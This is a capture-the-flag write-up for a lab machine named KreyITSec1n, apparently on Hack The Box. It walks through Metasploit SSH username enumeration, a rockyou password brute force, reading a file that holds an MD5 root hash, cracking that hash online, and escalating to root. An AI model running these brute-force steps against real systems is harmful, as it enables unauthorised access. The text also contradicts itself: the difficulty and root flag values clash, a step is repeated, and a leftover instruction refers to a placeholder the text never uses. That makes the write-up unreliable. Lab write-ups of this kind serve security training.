![banner](https://github.com/Netzknoten/HackTheBoxDevelopment/assets/114874531/31803b85-ca77-49eb-aabd-93968dfec7f3)



![htb](https://github.com/Netzknoten/HackTheBoxDevelopment/assets/114874531/52668f57-29eb-4702-95bb-5219739927da)
    	
<font size="10">KreyITSec1n</font>

​		27<sup>th</sup> Sep 2023

​		Machine Author(s): Manuel Krey

​		

 



### Description:

This machine (kreyitsec1n) KreyITSecLogin is a simple engine on Hack The Box.The objective is to obtain the `user.txt` and `root.txt` flags. The initial access to the machine was achieved by performing a specific set of steps.    

### Difficulty:

`medium`

### Flags:

User: `e10adc3949ba59abbe56e057f20f883e`

Root: `e7d66c50aa9a5c39c3d6d985b70e0a33`

# Foothold

To gain an initial foothold on the KreyITSecIn machine, we followed a series of steps.

# Enumeration

Initial enumeration was performed to gather information about the KreyITSec1n machine and the Webhost Blogger. This included identifying open ports, services, and potential vulnerabilities.

### User Enumeration

We used Metasploit to enumerate usernames on the SSH service:

	msfconsole
	use auxiliary/scanner/ssh/ssh_enumusers
	set RHOSTS 10.0.2.4
	set USER_FILE /usr/share/wordlists/metasploit/namelist.txt
	set THREADS 55
	run

We discovered the username "bob" as the blogger's first name.
SSH Login

We attempted to log in to the SSH service as user "bob" using a password brute-force attack:

	use auxiliary/scanner/ssh/ssh_login
	set THREADS 55
	set RHOSTS 10.0.2.4
	set USERNAME bob
	set PASS_FILE /usr/share/wordlists/rockyou.txt
	set VERBOSE true
	run
We successfully obtained the password in the output:

	10.0.2.4:22 - Success: 'bob:123456' 'uid=1000(bob) gid=1000(bob) groups=1000(bob),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),118(bluetooth) Linux kreyitsec1n 3.16.0-4-amd64 #1 SMP Debian 3.16.51-2 (2017-12-03) x86_64 GNU/Linux '

We logged in successfully using SSH:

	ssh bob@10.0.2.4
	
After a successful login, we executed the ls command and found the user.txt file.
	
	cat user.txt

We obtained the user flag: e10adc3949ba59abbe56e057f20f883e.


# Lateral Movement

To move laterally within the KreyITSecIn machine, we took the following actions:

### Enumeration of Additional Files

After gaining access as user "bob," we noticed a file named `topsecret.txt` and decided to examine its content. We executed the following command:

	cat topsecret.txt

The content of topsecret.txt revealed valuable information, including the root password in an MD5 hash format: 25f9e794323b453885f5181f1b624d0b.

# Privilege Escalation

We also found a file named topsecret.txt and examined its content with the following command:


	cat topsecret.txt

We obtained the root flag in the form of an MD5 hash: 25f9e794323b453885f5181f1b624d0b. We cracked this MD5 hash using an online tool (e.g., crackstation.net) and obtained the root password: 123456789.

We then logged in as root using the following command:

	su -

After becoming root, we executed the ls -la command and found the root.txt file.

	cat root.txt

We obtained the root flag: Y0uhav3Captur3Dth3FlaG.

# Conclusion

In conclusion, KreyITSecIn was an easy-level machine on Hack The Box that required a specific set of steps to gain initial access. Lateral movement and privilege escalation techniques were employed to reach the ultimate goal of obtaining both the user and root flags.

	Please replace `<machine_ip>` with the actual IP address of the KreyITSecIn machine and make any necessary adjustments based on your experience with the machine. If you have any further details to add or any changes to make, please feel free to do so.	

